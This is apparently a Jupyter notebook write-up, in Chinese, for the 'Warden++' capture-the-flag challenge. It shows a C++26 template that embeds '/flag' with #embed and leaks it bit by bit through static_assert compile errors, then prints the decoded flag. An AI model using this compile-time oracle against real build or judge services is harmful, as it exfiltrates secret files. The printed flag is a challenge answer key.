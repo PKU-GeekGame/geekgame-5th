{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "20052bef",
   "metadata": {},
   "source": [
    "# Warden++\n",
    "\n",
    "> 我们已经把 g++ 的版本更新到了 g++-15，支持 C++26 的若干 feature\n",
    "\n",
    "那显然使用C++最新最热的feature在编译期泄露flag了。谷歌搜索一下，就可以发现C++26新增了[embed](https://en.cppreference.com/w/cpp/preprocessor/embed) 功能，可以在编译期用文件内容初始化一个数组，这个数组甚至可以是constexpr，意味着我们能用它进行其他编译期操作。\n",
    "\n",
    "```python\n",
    "result = subprocess.run(\n",
    "    [\"g++-15\", tmp.name],\n",
    "    stdout=subprocess.DEVNULL,\n",
    "    stderr=subprocess.DEVNULL,\n",
    "    text=True,\n",
    ")\n",
    "```\n",
    "\n",
    "本题比较尴尬的一点是没有回显，但是代码里有print(stderr)，怀疑是后期加难度了。那既然没有回显，只能error based每次泄露一个bit了。一个思路是用static_assert，当输入的第i位是0返回false，是1返回true。\n",
    "\n",
    "我又懒了，请出Gemini指导：\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "de8e4298",
   "metadata": {},
   "outputs": [],
   "source": [
    "SOURCE_TEMPLATE = \"\"\"\\\n",
    "#include <type_traits>\n",
    "#include <cstddef>\n",
    "\n",
    "#ifndef BITPOS\n",
    "#define BITPOS {NTHBIT} // 0-based bit index across the whole file\n",
    "#endif\n",
    "\n",
    "#ifndef EXPECT\n",
    "#define EXPECT 1 // succeed when bit == EXPECT (0 or 1)\n",
    "#endif\n",
    "\n",
    "// 把 flag 文件嵌入为编译期数组\n",
    "constexpr unsigned char flag_content[] = {\n",
    "#embed \"/flag\"\n",
    "};\n",
    "\n",
    "// ------- 编译期工具 -------\n",
    "template <auto &Arr>\n",
    "struct arr_info\n",
    "{\n",
    "    // 计算数组长度（元素个数）\n",
    "    static constexpr std::size_t N =\n",
    "        std::extent_v<std::remove_reference_t<decltype(Arr)>>;\n",
    "};\n",
    "\n",
    "template <auto &Arr, std::size_t BitPos>\n",
    "struct bit_at\n",
    "{\n",
    "    static constexpr std::size_t byte = BitPos / 8;\n",
    "    static constexpr std::size_t bit = BitPos % 8; // 0 表示最低位（LSB）\n",
    "    static_assert(byte < arr_info<Arr>::N, \"BITPOS out of range\");\n",
    "    static constexpr unsigned value = (Arr[byte] >> bit) & 1u;\n",
    "};\n",
    "\n",
    "// ------- 触发判定（成功/失败） -------\n",
    "using gate = std::bool_constant<\n",
    "    (bit_at<flag_content, static_cast<std::size_t>(BITPOS)>::value == EXPECT)>;\n",
    "\n",
    "static_assert(gate::value,\n",
    "              \"compile gate failed: bit != EXPECT (flip EXPECT or BITPOS)\");\n",
    "\n",
    "// 也可以什么都不写；到这一步如果没有 static_assert 触发就算成功\n",
    "int main() { return 0; }\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "a9855fca",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'#include <type_traits>\\n#include <cstddef>\\n\\n#ifndef BITPOS\\n#define BITPOS 0 // 0-based bit index across the whole file\\n#endif\\n\\n#ifndef EXPECT\\n#define EXPECT 1 // succeed when bit == EXPECT (0 or 1)\\n#endif\\n\\n// 把 flag 文件嵌入为编译期数组\\nconstexpr unsigned char flag_content[] = {\\n#embed \"/flag\"\\n};\\n\\n// ------- 编译期工具 -------\\ntemplate <auto &Arr>\\nstruct arr_info\\n{\\n    // 计算数组长度（元素个数）\\n    static constexpr std::size_t N =\\n        std::extent_v<std::remove_reference_t<decltype(Arr)>>;\\n};\\n\\ntemplate <auto &Arr, std::size_t BitPos>\\nstruct bit_at\\n{\\n    static constexpr std::size_t byte = BitPos / 8;\\n    static constexpr std::size_t bit = BitPos % 8; // 0 表示最低位（LSB）\\n    static_assert(byte < arr_info<Arr>::N, \"BITPOS out of range\");\\n    static constexpr unsigned value = (Arr[byte] >> bit) & 1u;\\n};\\n\\n// ------- 触发判定（成功/失败） -------\\nusing gate = std::bool_constant<\\n    (bit_at<flag_content, static_cast<std::size_t>(BITPOS)>::value == EXPECT)>;\\n\\nstatic_assert(gate::value,\\n              \"compile gate failed: bit != EXPECT (flip EXPECT or BITPOS)\");\\n\\n// 也可以什么都不写；到这一步如果没有 static_assert 触发就算成功\\nint main() { return 0; }\\n\\nEND\\n'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def generate_source(nthbit) -> str:\n",
    "    source = SOURCE_TEMPLATE.replace(\"{NTHBIT}\", str(nthbit))\n",
    "    return source + '\\nEND\\n'\n",
    "\n",
    "generate_source(0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "f677b2ee",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'01100110 01101100 01100001 01100111 01111011'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def bytes_to_zeroone(data: bytes) -> str:\n",
    "    # 每个字节格式化为8位二进制，小端对齐，最后拼成一长串\n",
    "    return ' '.join(f'{byte:08b}' for byte in data)\n",
    "bytes_to_zeroone(b'flag{')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "499260ca",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'flag{EScApe_tecHnIQUes_upDaTE_wItH_tIMe}\\n\\x00\\x00'"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "b = \"011001100011011010000110111001101101111010100010110010101100011010000010000011101010011011111010001011101010011011000110000100100111011010010010100010101010101010100110110011101111101010101110000011100010001010000110001010101010001011111010111011101001001000101110000100101111101000101110100100101011001010100110101111100101000000000000000000\"\n",
    "\n",
    "# byte is little-endian\n",
    "b_in_bytes = ([b[i:i+8][::-1] for i in range(0, len(b), 8)])\n",
    "# decode them\n",
    "decoded_bytes = bytes(int(byte, 2) for byte in b_in_bytes)\n",
    "decoded_bytes"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}